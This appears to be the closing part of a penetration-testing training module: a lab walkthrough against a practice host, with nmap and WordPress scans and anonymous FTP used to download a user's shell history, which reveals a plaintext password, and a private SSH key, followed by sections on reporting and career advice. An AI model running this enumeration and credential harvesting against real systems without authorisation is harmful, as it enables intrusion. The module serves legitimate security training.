22/tcp   open  ssh              OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http             nginx 1.18.0 (Ubuntu)
443/tcp  open  ssl/http         Apache httpd 2.4.52 ((Ubuntu))
8000/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
8001/tcp open  ssl/vcom-tunnel?
8080/tcp open  http             Apache httpd 2.4.52 ((Ubuntu))
8889/tcp open  ssl/http         Golang net/http server
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 61.99 seconds

# 2. Low Hanging Fruits
sudo nmap -p21,443 -sC 10.129.12.10

Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-02-15 15:29 EST
Nmap scan report for cube-case.htb (10.129.12.10)
Host is up (0.027s latency).

PORT    STATE SERVICE
21/tcp  open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxr-x   3 john     john         4096 Feb 15 20:06 Dev

443/tcp open  https
|_http-title: Cube Case
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=cube-case.htb/organizationName=Organization/stateOrProvinceName=State/countryName=US
| Not valid before: 2025-02-15T18:00:13
|_Not valid after:  2026-02-15T18:00:13
| tls-alpn:
|_  http/1.1
|_http-generator: WordPress 6.7.2

Nmap done: 1 IP address (1 host up) scanned in 4.98 seconds

# 3. WordPress Enumeration
wpscan -e p --url <https://10.129.12.10> --disable-tls-checks --no-banner --plugins-detection passive -t 100

<SNIP>
[+] hash-form
 | Location: <https://cube-case.htb/wp-content/plugins/hash-form/>
 | Last Updated: 2025-01-29T15:54:00.000Z
 | [!] The version is out of date, the latest version is 1.2.4
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - <https://cube-case.htb/wp-content/plugins/hash-form/readme.txt>
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - <https://cube-case.htb/wp-content/plugins/hash-form/readme.txt>

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at <https://wpscan.com/register>

[+] Finished: Sat Feb 15 15:36:47 2025
[+] Requests Done: 109150
[+] Cached Requests: 13
[+] Data Sent: 29.515 MB
[+] Data Received: 14.722 MB
[+] Memory used: 545.891 MB
[+] Elapsed time: 00:01:54

# 4. FTP Enumeration
ftp 10.129.12.10 21

Connected to 10.129.12.10.
220 ProFTPD Server (Debian) [10.129.12.10]
Name (10.129.12.10:pwnbox): anonymous

331 Anonymous login ok, send your complete email address as your password
Password: anonymous

230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -al

229 Entering Extended Passive Mode (|||42851|)
150 Opening ASCII mode data connection for file list
drwxr-x---   4 john     john         4096 Feb 16 17:28 .
drwxr-x---   4 john     john         4096 Feb 16 17:28 ..
-rw-------   1 john     john         1153 Feb 15 21:13 .bash_history
-rw-r--r--   1 john     john          220 Jan  6  2022 .bash_logout
-rw-r--r--   1 john     john         3771 Jan  6  2022 .bashrc
drwx------   2 john     john         4096 Feb 15 17:16 .cache
-rw-------   1 john     john           20 Feb 16 16:34 .lesshst
-rw-r--r--   1 john     john          807 Jan  6  2022 .profile
drwxrwxr-x   2 john     john         4096 Feb 12 13:55 .ssh
-rw-r--r--   1 john     john            0 Feb 11 10:18 .sudo_as_admin_successful
-rw-------   1 john     john        17094 Feb 15 22:14 .viminfo
-rw-rw-r--   1 john     john          964 Feb 15 22:14 WordPress_Blog_Setup_Update.txt
226 Transfer complete

ftp> get WordPress_Blog_Setup_Update.txt

local: WordPress_Blog_Setup_Update.txt remote: WordPress_Blog_Setup_Update.txt
229 Entering Extended Passive Mode (|||12725|)
150 Opening BINARY mode data connection for WordPress_Blog_Setup_Update.txt (964 bytes)
100% |**********************************************|   964       14.97 KiB/s    00:00 ETA
226 Transfer complete
964 bytes received in 00:00 (7.92 KiB/s)

ftp> get .bash_history

local: bash_history remote: bash_history
229 Entering Extended Passive Mode (|||39373|)
150 Opening BINARY mode data connection for bash_history (1285 bytes)
100% |**********************************************|  1285       51.01 KiB/s    00:00 ETA
226 Transfer complete
1285 bytes received in 00:00 (10.95 KiB/s)

ftp> cd .ssh
ftp> ls -al

229 Entering Extended Passive Mode (|||26184|)
150 Opening ASCII mode data connection for file list
-rw-------   1 john     john         2602 Feb 12 13:55 id_rsa
-rw-r--r--   1 john     john          565 Feb 12 13:55 id_rsa.pub
226 Transfer complete

ftp> get id_rsa

local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||41007|)
150 Opening BINARY mode data connection for id_rsa (2602 bytes)
100% |**********************************************|  2602      108.80 KiB/s    00:00 ETA
226 Transfer complete
2602 bytes received in 00:00 (22.28 KiB/s)

Attacker@Pwnbox:~$ cat WordPress_Blog_Setup_Update.txt

**Subject: Update on WordPress Blog Setup**

Dear Team,

We are currently in the process of setting up a new blog using WordPress.
To facilitate this setup, we have temporarily configured an FTP server.

Please note:
- This FTP server is for internal use only during the initial setup phase.
- Access credentials are temporary and will be revoked once the blog setup is complete or if security necessitates it.

However, we have recently received a high-priority ticket that requires immediate attention. As a result,
the completion of the blog setup will be slightly delayed. We are committed to addressing this urgent issue first to ensure our services remain uninterrupted.

We will notify the responsible parties as soon as the WordPress blog and web application are fully operational.
We appreciate your understanding and patience as we work to prioritize our tasks effectively.

Thank you for your cooperation.

Best Regards,
John Doe
Development Team

Attacker@Pwnbox:~$ cat .bash_history

<SNIP>
sudo rm -f /tmp/old_log.txt
sudo find /var/log -type f -name "*.gz" -delete
sudo systemctl restart rsyslog
cd /var/backups
ls -la
sudo tar -czf full_backup.tar.gz /etc /var/log
sudo mv full_backup.tar.gz /mnt/backup/
cd /mnt/backup
echo "john:SuperSecurePass123" | sudo chpasswd
<SNIP>

Attacker@Pwnbox:~$ cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
kRnXtk6X8U1DNfAAAAC2pvaG5AdWJ1bnR1AQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----

```


# Documentation

* * *

Documentation is a detailed report that records what was found during a penetration test, along with recommendations for improvements. Such report usually contains several key parts:

- Statement Of Confidentiality
- Engagement Contacts
- Executive Summary
- Assignment
- Scope
- Deliveries
- Assessment Summary
- Compromise Walkthrough
- Remediation Summary

The goal of a documentation is to help different groups like IT teams, managers, and auditors understand the status of their systems security, and to plan improvements. We need to ensure that the results of our finding (and the possible impact) are easy to understand. Businesses and organization use such documentation to show they're adhering to certain security standard, like PCI DSS or ISO 27001.

A PoC is differs from documentation because it's a technical demonstration, like a script or step-by-step guide, that shows exactly how a vulnerability is found and exploited. For example, it might be a PowerShell script shows how to gain higher system privileges. While our documentation gives the big picture to everyone involved, a PoC focuses on proving that a specific security problem is real.

PoCs are usually included in the main documentation as evidence, rather than being separate reports. Since we have our PoC ready from a technical standpoint, we can include it in our documentation and focus on writing the report with the highest possible quality.

For junior penetration testers, you won’t necessarily need to present a documentation to a client directly. However, you may get a network segment assigned which you will need to test. The documentation you create will most probably be used in the overall report that the client receives. Therefore, it is crucial to ensure that what you write down is of the highest possible quality.

In the `Resources`, we have added a `DOCX` document which is a template that you can use and train your documentation skills.


# Reporting

* * *

The penetration testing team reports its findings to the client—whether to a team lead, manager, or the entire team—by starting with a structured report that includes a high-level summary and detailed security issues, such as exposed passwords or system vulnerabilities. Each identified problem is explained in plain language, detailing its severity (high, medium, or low), the method of discovery, and visual proof like screenshots, ensuring that everyone from IT staff to company executives can understand the issues.

The meeting encourages open discussion, which means you might be asked specifics regarding the risks, the potential spread of vulnerabilities, or any history of exploitation, with the testing team providing clarifications and supporting their findings. As you gain more experience, your participation will become more active, and if you're ever uncertain about something then your team can assist you. The goal of the discussion help everyone understand the true impact of the security issues discovered. For example, if an exposed file turned out to be simply test data, it might be less urgent to fix. But if it's an exposed password belonging to an important database, it becomes a top priority.

During the meeting, we do more than ensure that the problems are understood, it's about making plans to fix them so they never come back. The team suggests specific solutions, like changing file permissions or updating password policies, and makes sure these solutions will work for the client. IT staff might suggest quick fixes, while management plans for bigger changes. It is also possible that your team is asked to assist with major infrastructure changes.

Technical teams get to learn about how attackers might break in, which helps them better protect systems and defend against future attacks. Company leaders also learn how security problems could hurt the business. For example, exposing personal data could lead to huge fines (up to €20M under GDPR) or costly data breaches ($9.36M on average, according to IBM's 2024 report). Additionally, it prepares the client for security audits and opens new discussions, such as future threats, or attacks using artificial intelligence.

At the beginning of your career you aren't required to write such reports at this level yet. When you want to improve and reach that level you can go through the [Documentation & Reporting](https://academy.hackthebox.com/course/preview/documentation--reporting) module that will guide you through the entire process.


# Recommendations

* * *

Generally speaking, there is a lot to recommend for junior penetration testers and for those who want to become one. Everyone is doing it differently and almost everyone highlights the biggest issues they used to deal with. The bigger the recommendation the bigger was the struggle in this area for that person.

This section gets a little philosophical. So grab a snack, make a tea or coffee or some another drink and relax. You can take it seriously or simply ignore it and go your own way. It’s up to you.

The goal of this section is to give you recommendations which will help you to improve yourself, rather than focusing on a specific skill. One of the most important things that we recommend is to take time and think deeply about if this is what you really want. This is something that only you can know, and nobody can tell you otherwise. To figure this out you will need to spend days, maybe weeks, but most likely months.

Ok, let’s clarify why it is so important and why it can take so long. Let’s say you heard from your closest friends how great it is to reach the top of the Mount Everest. They say that you will experience a view that you're never going to see elsewhere in your life. It’s unique. It’s impressive, and not everyone can reach it. And suddenly it sounds so great that you start to experience the urge to do it yourself.

But how do you know if you really want it? Well, the real question here is:

- Do you want it for yourself or for someone else?

People today are dependent on the recognition of others because they cannot determine their own worth. You may have already experienced a similar situation. For example, you may have gone somewhere with your friends just to spend time with them, but you didn't necessarily want to visit the place. Or another example would be when you start playing a game that you don't necessarily like, but your friends persuade you to play it together.

Now let's find out how we can determine if we actually want something for ourselves (from our personal desire), or if we are following the wishes of others. Basically, it's child's play.

If a stranger told you about the experience of climbing Mount Everest, would you want it just as badly? - If not, then the urge you feel is socially based and not based on your own personal desires.

But if you have the desire to do it alone without your friends and family, then it is your real desire.

“There is no better talent that we have mastered than lying to ourselves." - Cry0l1t3

The reason why it will take so long is because we didn’t train ourselves to identify our own desire. Are you following rumors and stories, or do you really want to be one of the few who knows cybersecurity at its core?

* * *

Once you've figured out the answer, ask yourself - What are you doing this for?

Be brutally honest to yourself. You do not need to tell anyone. Only you know the truth. But this truth is what going to set your discipline.

Discipline is something that many people misunderstand. Basically, they say that you `must` do that specific thing if you want to get to a point. At the end, you have to force yourself to do something.

Ask yourself the following:

- If you want to drink a coffee/tea/soda, do you need to force yourself or do you just do it?

Force is only needed if resistance is in place. So…

- Why do you have to force yourself to do it?

Discipline is not about forcing yourself to something you do not want.

- Discipline is about focusing on the necessary and getting rid of the unnecessary things.

Let's look at an extreme example. If you really want to build a house on your own plot of land, but you go to training every day, play games, hang out with friends and watch movies, then you do things that are unnecessary for the actual construction of the house. As a result, it will take much longer to build the house.
However, if you have the desire to finally build your house for yourself and leave the other things aside, then your house will be built quickly in comparison.

* * *

If you want to master something, you need to apply the fundamentals that were first taught to you, then build your own system on top of it. It’s like driving a car. First, you do whatever your instructor says. After you know the basics on how to drive properly, you start to develop and apply your own style. The same principle applies with penetration testing as well. There is no need to reinvent the wheel. It’s like driving a car. First, you do whatever your instructor says. After you figured out how to drive properly, you start to develop and apply your own style. The same principle applies with penetration testing as well. There is no need to reinvent the wheel.

After these things become clear to you, think about the following the recommendations shown below as you work on future modules.

- Enumeration is key
- Pay attention to what you see, what you hear, what you think, what you do
- Understand the dependencies and relationships
- Take breaks at least for 20 minutes
- Try smarter, try differently
- Have fun
- You can


# Conclusion

* * *

Penetration tests require a lot of time and intensity to build up the appropriate repertoire. Based on the repertoire and how far it is developed, you will train your eye for many aspects and you will be able to recognize from small details how and what you can apply to confirm the potential vulnerability.

You build your repertoire with theory, practice and the application of both. Once you've seen how something works and can be exploited, it broadens your horizon of what's possible, but it's highly recommended to try to get the same and different results in other ways. Experiment and try different things to see how and what works. You can't permanently break anything in our labs and you can always reset the machines back to their default configuration.

Try to keep an eye on what stage of the penetration testing process you are at. Just ask yourself which stage you are in and what the goal of this stage is.

Following the process can sometimes be difficult because it is easy to skip a stage or two due to the tendency to immediately check whether a potential vulnerability will actually lead to access to the system. This very often leads to getting stuck at one point, not knowing how to exploit the vulnerability and being held up for far too long. Because only when we have all the information together can the potential vulnerability actually be exploited in conjunction with other information, but not on its own.

Apply what you have learned in all the other modules, stick to the process and don't be afraid to go researching if you don't know something. By researching, you will expand your repertoire, gain a much better understanding and be better able to apply what you have learned.


